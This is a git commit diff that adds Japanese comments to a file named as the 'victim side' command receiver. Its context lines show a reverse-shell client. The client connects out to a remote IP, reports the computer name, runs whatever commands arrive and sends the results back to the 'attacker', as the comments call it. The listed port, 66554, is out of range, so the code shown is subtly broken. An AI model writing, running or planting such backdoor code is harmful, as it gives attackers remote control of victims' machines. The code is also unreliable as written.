a89d5c5e3c4befae9855a5cba6b755721504e163
taku-147 <44944463+taku-147@users.noreply.github.com>
2023-11-14 21:04:51 +0900

    Update コマンド受信側(被害者).py

--- コマンド受信側(被害者).py
+++ コマンド受信側(被害者).py
@@ -12,6 +12,7 @@ def command_execute(command):
         return b'error=1'
 while True:
     try:
+        #Socket生成
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((IP, 66554))
             data = subprocess.check_output('echo %computername%', shell=True)
@@ -19,11 +20,14 @@ while True:
             while True:
                 data = s.recv(1024)
                 try:
+                    #コマンドを実行し、その結果を返す
                     result = command_execute(data.decode('utf-8'))
                     if not result:
+                        #実行結果が無の場合はexecutedを加害者に送信
                         s.sendall(b'executed')
                     s.sendall(result)
                 except:
+                    #なんか変なエラー起きたとき
                     s.sendall(b'error=0')
     except ConnectionRefusedError:
         continue
